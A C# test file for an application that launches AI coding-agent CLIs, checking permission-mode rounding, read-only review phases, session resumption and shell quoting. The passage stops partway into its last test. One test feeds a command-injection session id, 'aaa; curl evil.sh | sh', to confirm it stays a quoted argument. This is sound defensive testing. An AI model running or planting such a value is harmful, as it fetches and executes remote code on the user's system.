using System.Diagnostics;
using System.Text.Json;
using mTiles.Models;
using mTiles.Services;
using mTiles.Services.Agents;
using mTiles.Services.Providers;
using mTiles.Services.Shells;
using Xunit;
using static mTiles.Tests.TestUsage;

namespace mTiles.Tests;

/// <summary>
/// What each agent says it can be asked for, and what happens when it is asked for something else.
/// </summary>
/// <remarks>
/// Every table here is somebody else's CLI, measured once on 2026-08-29 against Claude Code 2.1.251,
/// codex-cli 0.141.0, opencode 1.18.18, pi 0.84.3 and agy 1.1.22. Pinned so that a move in one of those
/// contracts is a failing build rather than a tile that quietly stops doing what its strip says.
/// </remarks>
public class AiAgentTests
{
    private static readonly AiAgentInstance AnyInstance = new();

    /// <summary>An instance that adds nothing to a command line, so a test about the <em>session</em>
    /// sees the session and nothing else. A seeded instance asks for auto and high, which is a fact
    /// about the configuration rather than about how an agent resumes.</summary>
    private static readonly AiAgentInstance UnconfiguredInstance = new()
    {
        DefaultBehaviour = AiBehaviour.ToolDefault,
        DefaultEffort = AiEffort.ToolDefault,
    };

    /// <summary>An instance with nothing configured around it: no provider, and the model exactly as
    /// it was written.</summary>
    /// <remarks>What an agent tile hands <c>Interactive</c>, minus the provider lookup — the model is
    /// the only part of it these tests are about.</remarks>
    private static AgentRuntime Runtime(AiAgentInstance instance, string? model = null) =>
        AgentRuntime.For(new AppSettings(), instance, model);

    /// <summary>The shell a command is composed for, where the test is not about quoting.</summary>
    /// <remarks>None of the agents' own flags need quoting in any shell, so which one this is only
    /// matters to <see cref="Extra_arguments_are_quoted_by_the_shell_that_will_run_them"/>.</remarks>
    private static readonly IShellTerminal Shell = new PowerShellTerminal();

    // ── The catalog ─────────────────────────────────────

    /// <summary>
    /// Five agents, each with an id nothing else answers to, and one instance apiece on a first run.
    /// </summary>
    /// <remarks>An instance is seeded whether or not the agent is installed: it is configuration, and a
    /// row appearing the moment somebody installs a CLI would be a list changing under them for reasons
    /// they cannot see. Availability decides what can be <em>chosen</em>, not what exists.</remarks>
    [Fact]
    public void Every_agent_is_seeded_with_one_instance_of_its_own()
    {
        var seeded = AiAgentCatalog.SeedInstances();

        Assert.Equal(AiAgentCatalog.All.Count, seeded.Count);
        Assert.Equal(
            AiAgentCatalog.All.Select(agent => agent.Id).Order(),
            seeded.Select(instance => instance.AgentId).Order());

        // Ids are what a tile stores, so two agents sharing one would make a stored tile ambiguous.
        Assert.Equal(AiAgentCatalog.All.Count,
            AiAgentCatalog.All.Select(agent => agent.Id).Distinct(StringComparer.OrdinalIgnoreCase).Count());

        // And each instance is nameable and distinct, because the list is shown to somebody.
        Assert.All(seeded, instance => Assert.NotEqual("", instance.Name));
        Assert.Equal(seeded.Count, seeded.Select(instance => instance.Id).Distinct().Count());
    }

    /// <summary>
    /// A seeded instance passes no permission flag at all.
    /// </summary>
    /// <remarks>Nobody has been asked about a row that was seeded, and every agent tile made from
    /// one carries its behaviour to the CLI: anything above <see cref="AiBehaviour.ToolDefault"/>
    /// would turn the tool's own asking off on a fresh install, and the first symptom of that is an
    /// edit that already happened.</remarks>
    [Fact]
    public void A_seeded_instance_leaves_permission_to_the_tool()
    {
        Assert.All(AiAgentCatalog.SeedInstances(),
            instance => Assert.Equal(AiBehaviour.ToolDefault, instance.DefaultBehaviour));
    }

    /// <summary>A stored id nothing answers to finds nothing, rather than finding the first agent.
    /// </summary>
    [Fact]
    public void An_unknown_agent_id_finds_nothing()
    {
        Assert.NotNull(AiAgentCatalog.Find("claude"));
        Assert.NotNull(AiAgentCatalog.Find("CLAUDE"));
        Assert.Null(AiAgentCatalog.Find("some-agent-that-was-removed"));
        Assert.Null(AiAgentCatalog.Find(""));
        Assert.Null(AiAgentCatalog.Find(null));
    }

    // ── Compatibility ───────────────────────────────────

    /// <summary>
    /// codex and a local server are <b>not</b> compatible, which is the whole reason the OpenAI flavor
    /// is split in two.
    /// </summary>
    /// <remarks>Both would be called "OpenAI" by anybody describing them, and pairing them would be
    /// offered and would not work: codex speaks <c>/v1/responses</c> and LM Studio and Ollama serve
    /// <c>/v1/chat/completions</c>. codex reaches a local model through its own <c>--oss</c> instead,
    /// which is not something a provider instance can express.</remarks>
    [Fact]
    public void Codex_is_not_compatible_with_a_local_chat_completions_server()
    {
        IReadOnlyList<ApiFlavor> localServer =
            [ApiFlavor.OpenAiChatCompletions, ApiFlavor.OllamaNative];

        Assert.False(SpeaksAnyOf(new CodexAgent(), localServer));
        Assert.True(SpeaksAnyOf(new OpenCodeAgent(), localServer));
        Assert.True(SpeaksAnyOf(new PiAgent(), localServer));

        // And Claude Code needs the Anthropic shape, which a local server does not serve either.
        Assert.False(SpeaksAnyOf(new ClaudeAgent(), localServer));
        Assert.True(SpeaksAnyOf(new ClaudeAgent(), [ApiFlavor.Anthropic]));
    }

    private static bool SpeaksAnyOf(IAiAgent agent, IReadOnlyList<ApiFlavor> served) =>
        agent.ConsumesApiFlavors.Intersect(served).Any();

    // ── Rounding ────────────────────────────────────────

    /// <summary>
    /// Behaviour rounds down, and never to bypass.
    /// </summary>
    /// <remarks>The one direction that must not be got wrong: falling to a weaker mode costs a run that
    /// stops to ask about something, while rounding up means an agent doing unattended what the user
    /// only authorised under supervision.</remarks>
    [Fact]
    public void Behaviour_rounds_down_and_never_up_to_bypass()
    {
        IReadOnlyList<AiBehaviour> onlyBypass = [AiBehaviour.BypassPermissions, AiBehaviour.ToolDefault];

        // pi's list, and the case that matters: nothing weaker exists, so it falls off the scale rather
        // than being promoted to the strongest thing on it.
        Assert.Equal(AiBehaviour.ToolDefault, AiBehaviours.RoundDown(AiBehaviour.Auto, onlyBypass));
        Assert.Equal(AiBehaviour.ToolDefault, AiBehaviours.RoundDown(AiBehaviour.Plan, onlyBypass));
        Assert.Equal(AiBehaviour.BypassPermissions,
            AiBehaviours.RoundDown(AiBehaviour.BypassPermissions, onlyBypass));

        // Claude Code's headless list, and the case the rule exists for: accept-edits is not on it, and
        // auto is *stronger* — so it falls to passing no flag rather than being promoted one step.
        IReadOnlyList<AiBehaviour> claudeHeadless =
            [AiBehaviour.Auto, AiBehaviour.BypassPermissions, AiBehaviour.ToolDefault];
        Assert.Equal(AiBehaviour.ToolDefault,
            AiBehaviours.RoundDown(AiBehaviour.AcceptEdits, claudeHeadless));

        // With something genuinely weaker available, that is what is taken — the strongest of what is
        // left below what was asked for.
        Assert.Equal(AiBehaviour.Auto, AiBehaviours.RoundDown(AiBehaviour.BypassPermissions,
            [AiBehaviour.Plan, AiBehaviour.Auto, AiBehaviour.ToolDefault]));

        // An agent that can only read gets a run that only reads, however much was asked of it. Two
        // steps down rather than one is still the right direction; the alternative is a mode the agent
        // does not have.
        Assert.Equal(AiBehaviour.Plan,
            AiBehaviours.RoundDown(AiBehaviour.BypassPermissions, [AiBehaviour.Plan]));
        Assert.Equal(AiBehaviour.Plan, AiBehaviours.RoundDown(AiBehaviour.Auto, [AiBehaviour.Plan]));

        // And an empty list has nothing to fall to at all.
        Assert.Equal(AiBehaviour.ToolDefault, AiBehaviours.RoundDown(AiBehaviour.Auto, []));
    }

    /// <summary>
    /// Effort rounds to the nearest level the agent has, and upward on a tie.
    /// </summary>
    /// <remarks>The opposite of behaviour's rule, deliberately: being wrong here costs money, and the
    /// tile is meant to be left alone, where a shallow attempt spends as much of the attempt budget as
    /// a careful one.</remarks>
    [Theory]
    [InlineData(AiEffort.Max, AiEffort.High)]
    [InlineData(AiEffort.XHigh, AiEffort.High)]
    [InlineData(AiEffort.High, AiEffort.High)]
    [InlineData(AiEffort.Low, AiEffort.Low)]
    [InlineData(AiEffort.ToolDefault, AiEffort.ToolDefault)]
    public void Effort_rounds_to_the_nearest_level_the_agent_has(AiEffort wanted, AiEffort expected)
    {
        IReadOnlyList<AiEffort> threeLevels =
            [AiEffort.Low, AiEffort.Medium, AiEffort.High, AiEffort.ToolDefault];

        Assert.Equal(expected, AiEfforts.RoundToNearest(wanted, threeLevels));
    }

    /// <summary>A tie goes up, which is the half of "to nearest" a single example cannot show.</summary>
    [Fact]
    public void An_effort_equally_near_two_levels_rounds_up()
    {
        // Low and High sit one step either side of Medium, so the tie is real and the higher wins.
        Assert.Equal(AiEffort.High, AiEfforts.RoundToNearest(AiEffort.Medium, [AiEffort.Low, AiEffort.High]));

        // Not a tie: Low is one step from Medium and Max is three, so nearest is Low even though the
        // rule leans upward.
        Assert.Equal(AiEffort.Low, AiEfforts.RoundToNearest(AiEffort.Medium, [AiEffort.Low, AiEffort.Max]));

        // And with nothing on the scale at all, the answer is to pass no flag rather than to guess.
        Assert.Equal(AiEffort.ToolDefault, AiEfforts.RoundToNearest(AiEffort.Medium, [AiEffort.ToolDefault]));
    }

    // ── Capability tables, per agent, per usage ─────────

    /// <summary>
    /// No agent offers a mode that asks, for a run with nobody to ask.
    /// </summary>
    /// <remarks>A headless refusal is not a question, it is a tool call that quietly fails — which is
    /// what <c>AiChunkKind.Denied</c> counts. <see cref="AiBehaviour.AcceptEdits"/> is the worst of them
    /// because it looks like it is working: the edits go through and everything else is refused.
    /// </remarks>
    [Fact]
    public void No_agent_offers_an_asking_mode_for_a_headless_run()
    {
        foreach (var agent in AiAgentCatalog.All)
        {
            var offered = agent.SupportedBehaviours(AnyInstance, Implementing);

            Assert.DoesNotContain(AiBehaviour.Ask, offered);
            Assert.DoesNotContain(AiBehaviour.AcceptEdits, offered);
            Assert.NotEmpty(offered);
        }
    }

    /// <summary>
    /// A phase that writes nothing runs read-only, whatever the tile was set to.
    /// </summary>
    /// <remarks>Decision 9: the user chooses for the execution phase and the agent chooses for the
    /// rest. It matters most now that review can run as a <em>second</em> agent — two agents writing
    /// into one worktree is something <c>GoalBaseline</c> photographed only once.</remarks>
    [Theory]
    [InlineData("claude", "--permission-mode", "plan")]
    [InlineData("codex", "--sandbox", "read-only")]
    [InlineData("agy", "--mode", "plan")]
    public void A_phase_that_writes_nothing_is_run_read_only(string binary, string flag, string value)
    {
        var agent = AiProcessRunner.GetRunner(binary);

        Assert.Equal([flag, value], agent.BehaviourArgs(AiBehaviour.BypassPermissions, Reviewing));
        Assert.Equal([flag, value], agent.BehaviourArgs(AiBehaviour.ToolDefault, Reviewing));

        // The interactive session is the user's own and is not overridden.
        Assert.NotEqual(new[] { flag, value },
            agent.BehaviourArgs(AiBehaviour.BypassPermissions, AiUsage.Interactive));
    }

    /// <summary>
    /// opencode has no read-only mode, so a phase that writes nothing is simply not given the flag.
    /// </summary>
    /// <remarks>The other half of decision 9, for the agent that cannot be put into a read-only mode at
    /// all: <c>--auto</c> is what would let a reviewing agent edit the worktree <c>GoalBaseline</c>
    /// photographed only once, and withholding it is the whole of what can be done here.</remarks>
    [Fact]
    public void Opencode_withholds_its_one_flag_from_a_phase_that_writes_nothing()
    {
        var opencode = new OpenCodeAgent();

        Assert.Empty(opencode.BehaviourArgs(AiBehaviour.BypassPermissions, Reviewing));
        Assert.Equal([AiBehaviour.ToolDefault], opencode.SupportedBehaviours(AnyInstance, Reviewing));

        // The interactive session is the user's own and is not overridden.
        Assert.Equal(["--auto"],
            opencode.BehaviourArgs(AiBehaviour.BypassPermissions, AiUsage.Interactive));
    }

    /// <summary>
    /// A review told to establish the build and the tests is not held to reading.
    /// </summary>
    /// <remarks>The prompt tells the reviewer to establish those "by running this project's own
    /// commands rather than by reading the diff", and a build writes — <c>obj/</c>, <c>bin/</c>,
    /// <c>target/</c>. Under <c>--sandbox read-only</c> or claude's <c>plan</c> those commands fail, so
    /// the reviewer either reports a build failure the changes never caused, burning an attempt, or
    /// silently skips the tile's default completion criterion. What keeps it from editing source is the
    /// sentence in the review prompt, not a sandbox that would deny the check itself.</remarks>
    [Theory]
    [InlineData("claude", "--permission-mode", "plan")]
    [InlineData("codex", "--sandbox", "read-only")]
    [InlineData("agy", "--mode", "plan")]
    public void A_review_that_has_to_build_the_project_is_not_held_to_reading(
        string binary, string flag, string value)
    {
        var agent = AiProcessRunner.GetRunner(binary);

        Assert.NotEqual(new[] { flag, value },
            agent.BehaviourArgs(AiBehaviour.BypassPermissions, ReviewingWithHealthChecks));
        Assert.Contains(AiBehaviour.BypassPermissions,
            agent.SupportedBehaviours(AnyInstance, ReviewingWithHealthChecks));

        // And the same review with nothing to establish still is.
        Assert.Equal([flag, value], agent.BehaviourArgs(AiBehaviour.BypassPermissions, Reviewing));
    }

    /// <summary>
    /// opencode's one flag follows the same rule, since withholding it is all it has.
    /// </summary>
    [Fact]
    public void Opencode_gives_a_review_that_has_to_build_the_project_its_one_flag()
    {
        var opencode = new OpenCodeAgent();

        Assert.Equal(["--auto"],
            opencode.BehaviourArgs(AiBehaviour.BypassPermissions, ReviewingWithHealthChecks));
        Assert.Empty(opencode.BehaviourArgs(AiBehaviour.BypassPermissions, Reviewing));
    }

    /// <summary>
    /// The whole headless command line codex is given, because <c>codex exec</c> has no <c>-a</c>.
    /// </summary>
    /// <remarks>Measured on codex-cli 0.141.0: <c>--ask-for-approval</c> is on <c>codex</c> and
    /// <c>codex resume</c> only, and <c>codex exec --sandbox workspace-write -a never "say OK"</c>
    /// answers <c>error: unexpected argument '-a' found</c> and runs nothing — so on
    /// <see cref="AiBehaviour.Auto"/>, which is the tile's default, every implementation phase and
    /// every health-checking review failed on a flag the user never typed. Asserted as the whole argv
    /// rather than as the fragment: the fragment was right about the interactive session and wrong
    /// about the only place it is used, and only the assembled command line shows that.</remarks>
    [Fact]
    public void Codex_is_run_headless_without_the_approval_flag_exec_does_not_have()
    {
        var codex = new CodexAgent();

        var psi = new ProcessStartInfo();
        codex.ConfigureProcess(psi, "the prompt", streaming: false, Implementing,
            AiBehaviour.Auto, AiEffort.High);

        Assert.Equal(
            ["exec", "--sandbox", "workspace-write", "-c", "model_reasoning_effort=high", "the prompt"],
            psi.ArgumentList);

        // A review that has to build the project takes the same permission, and the same absence.
        var reviewing = new ProcessStartInfo();
        codex.ConfigureProcess(reviewing, "the prompt", streaming: false, ReviewingWithHealthChecks,
            AiBehaviour.Auto, AiEffort.ToolDefault);

        Assert.Equal(["exec", "--sandbox", "workspace-write", "the prompt"], reviewing.ArgumentList);

        // The interactive commands do have the axis, and keep it.
        Assert.Equal(["--sandbox", "workspace-write", "-a", "never"],
            codex.BehaviourArgs(AiBehaviour.Auto, AiUsage.Interactive));
    }

    /// <summary>
    /// What a run is actually given is fitted to what the agent supports, and by the runner rather
    /// than by each agent.
    /// </summary>
    /// <remarks>Without this <c>SupportedBehaviours</c> and <c>SupportedEfforts</c> are documentation:
    /// a mode an agent does not have reaches its command line, and the run fails on a flag the user
    /// never typed.</remarks>
    [Fact]
    public void What_an_agent_cannot_do_is_rounded_before_it_reaches_a_command_line()
    {
        var opencode = new OpenCodeAgent();

        // opencode's gate is a boolean, so "auto" — the tile's default — has nothing to map to and
        // falls to passing no flag rather than to the bypass above it.
        var (behaviour, effort) =
            AiProcessRunner.Fit(opencode, Implementing, AiBehaviour.Auto, AiEffort.Max);

        Assert.Equal(AiBehaviour.ToolDefault, behaviour);
        Assert.Equal(AiEffort.ToolDefault, effort);

        // agy's scale stops at high, and effort rounds to nearest rather than down.
        var agy = AiProcessRunner.GetRunner("agy");
        Assert.Equal(AiEffort.High, AiProcessRunner.Fit(agy, Implementing, AiBehaviour.Auto, AiEffort.Max).Effort);
    }

    /// <summary>
    /// pi declares bypass and nothing else, because that is what a pi run always is.
    /// </summary>
    /// <remarks>Measured: <c>--approve</c> is about trusting project-local files, not tool calls, so
    /// there is no gate. Offering "auto" would be a lie about what is going to happen to a repository,
    /// and one the rounding rules could not catch.</remarks>
    [Fact]
    public void Pi_admits_that_it_has_no_gate()
    {
        var pi = new PiAgent();

        Assert.Equal([AiBehaviour.BypassPermissions, AiBehaviour.ToolDefault],
            pi.SupportedBehaviours(AnyInstance, Implementing));
        Assert.Empty(pi.BehaviourArgs(AiBehaviour.BypassPermissions, Implementing));
        Assert.Empty(pi.BehaviourArgs(AiBehaviour.Auto, Reviewing));
    }

    /// <summary>
    /// opencode's <c>--auto</c> is our bypass, not our auto.
    /// </summary>
    /// <remarks>Its own help calls it "auto-approve permissions that are not explicitly denied
    /// (dangerous!)". Mapped by meaning, never by spelling — reading it as
    /// <see cref="AiBehaviour.Auto"/> would put a repository under an unattended agent on the tile's
    /// default setting.</remarks>
    [Fact]
    public void Opencodes_auto_is_mapped_by_meaning_and_not_by_its_name()
    {
        var opencode = new OpenCodeAgent();

        Assert.Equal(["--auto"], opencode.BehaviourArgs(AiBehaviour.BypassPermissions, Implementing));
        Assert.Empty(opencode.BehaviourArgs(AiBehaviour.Auto, Implementing));
        Assert.DoesNotContain(AiBehaviour.Auto, opencode.SupportedBehaviours(AnyInstance, Implementing));
    }

    /// <summary>
    /// codex's effort is a config key, and the token blamed for a refusal is the key rather than
    /// <c>-c</c>.
    /// </summary>
    /// <remarks><c>-c</c> carries every config key codex has, so blaming it would name a flag instead of
    /// a setting — and the message exists to tell somebody which control to change.</remarks>
    [Fact]
    public void Codex_carries_its_effort_as_a_config_key()
    {
        var codex = new CodexAgent();

        Assert.Equal(["-c", "model_reasoning_effort=high"], codex.EffortArgs(AiEffort.High, Implementing));
        Assert.Equal("model_reasoning_effort", codex.EffortFlagFor(AiEffort.High, Implementing));
        Assert.Null(codex.EffortFlagFor(AiEffort.ToolDefault, Implementing));

        // A refused config key does not read like a refused option, which is the second shape
        // RejectedFlag had to learn.
        Assert.True(AiEfforts.LooksLikeRejectedEffort(
            "error: unknown config key model_reasoning_effort",
            codex.EffortFlagFor(AiEffort.High, Implementing),
            codex.BehaviourFlagFor(AiBehaviour.Auto, Implementing)));
    }

    // ── Sessions ────────────────────────────────────────

    /// <summary>Each agent's strategy, which is what decides whether a tile's session id is ours to
    /// choose and when its layout has to be saved.</summary>
    [Theory]
    [InlineData("claude", SessionStrategy.Fixed)]
    [InlineData("pi", SessionStrategy.Fixed)]
    [InlineData("opencode", SessionStrategy.ImportedFixed)]
    [InlineData("codex", SessionStrategy.CapturedAfterStart)]
    [InlineData("agy", SessionStrategy.CapturedAfterStart)]
    public void Each_agent_says_how_its_session_is_named(string agentId, SessionStrategy expected)
    {
        Assert.Equal(expected, AiAgentCatalog.Find(agentId)!.SessionStrategy);
    }

    /// <summary>
    /// Neither agent that has to be told an id is ever handed one it has not seen.
    /// </summary>
    /// <remarks>
    /// <para><c>codex resume &lt;unknown&gt;</c> opens an interactive <b>picker</b>, which in a launch
    /// chain is a tile waiting for a keystroke nobody knows it wants. <c>agy --conversation
    /// &lt;unknown&gt;</c> is worse in a quieter way: it warns, silently starts a <em>new</em>
    /// conversation and exits 0, so a chain judging on the exit code cannot tell a resumed tile from a
    /// lost one.</para>
    /// <para>Both are closed the same way — an empty session id starts a plain session, and the id is
    /// captured afterwards.</para>
    /// </remarks>
    [Theory]
    [InlineData("codex", "codex")]
    [InlineData("agy", "agy")]
    public void A_session_that_was_never_captured_is_not_resumed(string agentId, string plainCommand)
    {
        var agent = AiAgentCatalog.Find(agentId)!;

        var fresh = agent.Interactive(Runtime(UnconfiguredInstance), sessionId: "", Shell);
        Assert.Equal(plainCommand, fresh.Startup);
        Assert.DoesNotContain("resume", fresh.Startup!, StringComparison.Ordinal);
        Assert.DoesNotContain("--conversation", fresh.Startup!, StringComparison.Ordinal);

        var resumed = agent.Interactive(Runtime(UnconfiguredInstance), "0198f0a4-1c2e-7c39-8f21-6a1b0c7d5e42", Shell);
        Assert.Contains("0198f0a4-1c2e-7c39-8f21-6a1b0c7d5e42", resumed.Startup!, StringComparison.Ordinal);

        // And the fallback is always the plain session: losing one conversation beats losing the tile.
        Assert.Equal(plainCommand, resumed.Fallback);
    }

    /// <summary>The agents that name their own session put the id straight on the command line, so no
    /// bookkeeping exists anywhere.</summary>
    [Theory]
    [InlineData("claude", "claude --resume the-id")]
    [InlineData("pi", "pi --session-id the-id")]
    public void An_agent_that_can_be_told_an_id_is_told_it(string agentId, string expected)
    {
        Assert.Equal(expected, AiAgentCatalog.Find(agentId)!.Interactive(Runtime(UnconfiguredInstance), "the-id", Shell).Startup);
    }

    /// <summary>
    /// A session id carrying a shell metacharacter is quoted, so it stays an argument.
    /// </summary>
    /// <remarks>The id is not this application's to trust: it is <c>TileNode.TileId</c> out of a layout
    /// file anybody can edit, or the string a captured agent printed as its conversation id. Interpolated
    /// raw into the script that goes to <c>powershell -Command</c> / <c>bash -c</c>, a <c>;</c> in it is
    /// a second command running in the user's repository.</remarks>
    [Theory]
    [InlineData("claude")]
    [InlineData("pi")]
    [InlineData("codex")]
    [InlineData("agy")]
    [InlineData("opencode")]
    public void A_session_id_carrying_a_command_is_quoted(string agentId)
    {
        foreach (var shell in new IShellTerminal[] { new PowerShellTerminal(), new BashTerminal() })
        {
            var startup = AiAgentCatalog.Find(agentId)!
                .Interactive(Runtime(UnconfiguredInstance), "aaa; curl evil.sh | sh", shell).Startup!;

            var quoted = shell.Quote("aaa; curl evil.sh | sh");

            Assert.Contains(quoted, startup, StringComparison.Ordinal);
            // Nothing of the id outside the quotes: the whole of it is one argument.
            Assert.DoesNotContain("aaa; curl", startup.Replace(quoted, string.Empty), StringComparison.Ordinal);
        }
    }

    /// <summary>
    /// Claude Code continues the session first and creates it only when there was none.
    /// </summary>
    /// <remarks>Measured against Claude Code 2.1.251: <c>--session-id</c> refuses an id that already
    /// exists ("Session ID … is already in use", exit 1) and <c>--resume</c> refuses one that does not,
    /// so only this order resumes a tile on its second and every later launch. With the creating
    /// command first, every launch after the first fell through to the fallback — and a fallback of
    /// plain <c>claude</c> carries no id at all, so the conversation was lost for good.</remarks>
    [Fact]
    public void Claude_resumes_before_it_creates()
    {
        var plan = new ClaudeAgent().Interactive(Runtime(UnconfiguredInstance), "the-id", Shell);

        Assert.Equal("claude --resume the-id", plan.Startup);
        Assert.Equal("claude --session-id the-id", plan.Fallback);
        Assert.True(plan.RunsCommandChain);
    }

    /// <summary>
    /// opencode resumes first and imports only when resuming found nothing.
    /// </summary>
    /// <remarks>
    /// <para>That order is the whole arrangement: <c>--session</c> only <em>continues</em> a session, so
    /// an id we invented is refused — and <c>opencode import</c> is create-if-missing, keeping the
    /// title and the messages of an id that already exists rather than wiping the conversation the tile
    /// is trying to resume.</para>
    /// <para>The import runs as one of the tile's own commands rather than being done for it, because
    /// the document's <c>directory</c> is ignored: the session lands in the project of the import's
    /// working directory, which is the tile's.</para>
    /// </remarks>
    [Fact]
    public void Opencode_imports_its_session_only_as_the_fallback()
    {
        var plan = new OpenCodeAgent().Interactive(Runtime(UnconfiguredInstance),
            "ses_1b9d6bcd-bbfd-4b2d-9b5d-ab8dfbbd4bed", Shell);

        Assert.Equal("opencode --session ses_1b9d6bcd-bbfd-4b2d-9b5d-ab8dfbbd4bed", plan.Startup);
        Assert.StartsWith("opencode import ", plan.Fallback!, StringComparison.Ordinal);

        // The token, not the path it expands to: writing the document is the launcher's job and the
        // token is the only thing that tells it there is one to write (OpenCodeSession.PrepareIfReferenced).
        // Spelling the path out here reads the same to a shell and is invisible to the launcher, so the
        // import would point at a file nobody ever wrote and the tile would lose its conversation.
        Assert.Contains(TileScript.OpenCodeSessionFileToken, plan.Fallback!, StringComparison.Ordinal);
        Assert.EndsWith("; opencode --session ses_1b9d6bcd-bbfd-4b2d-9b5d-ab8dfbbd4bed",
            plan.Fallback!, StringComparison.Ordinal);

        // Naming a fallback is what puts the tile on the command-chain path rather than the plain
        // interactive one, so this is not decoration.
        Assert.True(plan.RunsCommandChain);
    }

    /// <summary>
    /// What an instance is configured with reaches the tile's own command line, on both commands.
    /// </summary>
    /// <remarks>The instance documents its two defaults as applying "wherever the instance is used —
    /// the agent tile included". They did not: every implementation of <c>Interactive</c> ignored the
    /// instance, so an agent tile ran on the CLI's factory settings whatever the row said. The fallback
    /// gets them too, because it is the same session by another route rather than a lesser one.
    /// </remarks>
    [Fact]
    public void An_agent_tile_launches_with_what_its_instance_was_configured_with()
    {
        var instance = new AiAgentInstance
        {
            DefaultBehaviour = AiBehaviour.Plan,
            DefaultEffort = AiEffort.Low,
        };

        var plan = new ClaudeAgent().Interactive(Runtime(instance), "the-id", Shell);

        Assert.Equal("claude --resume the-id --permission-mode plan --effort low", plan.Startup);
        Assert.Equal("claude --session-id the-id --permission-mode plan --effort low", plan.Fallback);
    }

    /// <summary>
    /// A level the agent does not have is rounded before it reaches the command line, not after.
    /// </summary>
    /// <remarks>Same rule as a headless run's: <c>SupportedEfforts</c> is enforcement rather than
    /// documentation, and codex's scale stops at <c>high</c>. Unfitted, an instance set to <c>max</c>
    /// would put a config value on the tile's command line that the model rejects — a launch that fails
    /// on a flag the user never typed.</remarks>
    [Fact]
    public void An_instance_asking_for_more_than_the_agent_has_is_fitted_first()
    {
        var instance = new AiAgentInstance
        {
            DefaultBehaviour = AiBehaviour.BypassPermissions,
            DefaultEffort = AiEffort.Max,
        };

        Assert.Contains("model_reasoning_effort=high",
            new CodexAgent().Interactive(Runtime(instance), "", Shell).Startup!, StringComparison.Ordinal);
    }

    /// <summary>
    /// The model set on an instance reaches the agent's own command line.
    /// </summary>
    /// <remarks>Four of the five were told nothing at all: the instance's model was a field the agent
    /// never read, so a tile pointed at a provider through <c>OPENAI_BASE_URL</c> ran on the CLI's own
    /// default model against an address that usually does not serve it — a launch that succeeds and a
    /// run that fails. Measured 2026-08-30: <c>--model</c> on opencode 1.18.18, codex-cli 0.141.0,
    /// pi 0.84.3 and agy 1.1.22 alike.</remarks>
    [Theory]
    [InlineData("opencode")]
    [InlineData("codex")]
    [InlineData("pi")]
    [InlineData("agy")]
    public void The_model_an_instance_names_reaches_the_command_line(string agentId)
    {
        var agent = AiAgentCatalog.Find(agentId)!;
        var instance = new AiAgentInstance
        {
            DefaultBehaviour = AiBehaviour.ToolDefault,
            DefaultEffort = AiEffort.ToolDefault,
            Model = "some/model",
        };

        var plan = agent.Interactive(Runtime(instance, "some/model"), "the-id", Shell);

        Assert.Contains("--model some/model", plan.Startup!, StringComparison.Ordinal);
        // The fallback is the same session by another route, so it runs on the same model.
        Assert.Contains("--model some/model", plan.Fallback!, StringComparison.Ordinal);
    }

    /// <summary>Claude Code is told through the environment instead, and says so.</summary>
    /// <remarks>Two routes for one setting would be two places to forget it;
    /// <see cref="IAiAgent.AcceptsModel"/> is what keeps "no flag" from reading as "no model".</remarks>
    [Fact]
    public void Claude_carries_its_model_in_the_environment_rather_than_on_the_command_line()
    {
        var claude = new ClaudeAgent();
        var instance = new AiAgentInstance
        {
            DefaultBehaviour = AiBehaviour.ToolDefault,
            DefaultEffort = AiEffort.ToolDefault,
            Model = "claude-opus-5",
        };

        Assert.True(claude.AcceptsModel);
        Assert.Empty(claude.ModelArgs("claude-opus-5", AiUsage.Interactive));
        Assert.DoesNotContain("--model",
            claude.Interactive(Runtime(instance, "claude-opus-5"), "the-id", Shell).Startup!,
            StringComparison.Ordinal);

        Assert.Equal("claude-opus-5",
            claude.EnvFor(Runtime(instance, "claude-opus-5"))["ANTHROPIC_MODEL"]);
    }

    /// <summary>
    /// An unresolved sentinel never reaches a command line or the environment.
    /// </summary>
    /// <remarks><c>AiModelChoice.FirstLoaded</c> is a question, not a model name, and a provider asked
    /// for <c>__first_loaded__</c> answers that it has no such model. A caller that has not resolved it
    /// gets the agent's own choice instead — and the tile refuses that launch, which is where the user
    /// is told.</remarks>
    [Fact]
    public void The_first_loaded_sentinel_is_never_passed_to_an_agent()
    {
        var instance = new AiAgentInstance
        {
            DefaultBehaviour = AiBehaviour.ToolDefault,
            DefaultEffort = AiEffort.ToolDefault,
            Model = AiModelChoice.FirstLoaded,
        };

        Assert.DoesNotContain(AiModelChoice.FirstLoaded,
            new OpenCodeAgent().Interactive(Runtime(instance), "ses_the-id", Shell).Startup!,
            StringComparison.Ordinal);

        Assert.DoesNotContain("ANTHROPIC_MODEL", new ClaudeAgent().EnvFor(Runtime(instance)).Keys);
    }

    /// <summary>An agent nothing is known about carries no model, and answers that rather than
    /// dropping one silently.</summary>
    [Fact]
    public void An_agent_with_no_model_flag_says_so()
    {
        Assert.False(new GenericAgent("some-tool").AcceptsModel);
        Assert.Empty(new GenericAgent("some-tool").ModelArgs("some/model", AiUsage.Interactive));
    }

    /// <summary>
    /// The flag this application has not heard of yet still reaches the agent, quoted the way the
    /// shell that is about to run it quotes.
    /// </summary>
    /// <remarks>These are typed into a live shell rather than handed to <c>Process.Start</c>, so an
    /// argument carrying a space has to survive that shell — and the shells do not agree on how.
    /// A local <c>\"</c> escape was PowerShell's cue to interpolate rather than to quote, so an entry
    /// carrying <c>"</c>, <c>$</c> or a backtick was mangled or partly executed; the shell owns its own
    /// rule (<see cref="IShellTerminal.Quote"/>). A flag that needs no quoting is still left alone,
    /// because quotes round every flag read as a mistake in the scrollback.</remarks>
    [Fact]
    public void Extra_arguments_are_quoted_by_the_shell_that_will_run_them()
    {
        var instance = new AiAgentInstance
        {
            DefaultBehaviour = AiBehaviour.ToolDefault,
            DefaultEffort = AiEffort.ToolDefault,
            ExtraArgs = ["--add-dir", "/tmp/some repo", "   "],
        };

        Assert.Equal("pi --session-id the-id --add-dir '/tmp/some repo'",
            new PiAgent().Interactive(Runtime(instance), "the-id", new PowerShellTerminal()).Startup);

        Assert.Equal("pi --session-id the-id --add-dir '/tmp/some repo'",
            new PiAgent().Interactive(Runtime(instance), "the-id", new BashTerminal()).Startup);
    }

    /// <summary>
    /// An argument the shell would read as syntax is handed to that shell's own quoting.
    /// </summary>
    /// <remarks>The case that was silently wrong: <c>$(...)</c> inside PowerShell's double quotes is a
    /// subexpression it evaluates, so a value meant as text ran as a command in the user's own shell.
    /// Single quotes with <c>''</c> doubling is PowerShell's rule and <c>'\''</c> is the POSIX one,
    /// and neither is spelled anywhere but on the shell.</remarks>
    [Fact]
    public void An_argument_a_shell_would_read_as_syntax_is_quoted_by_that_shell()
    {
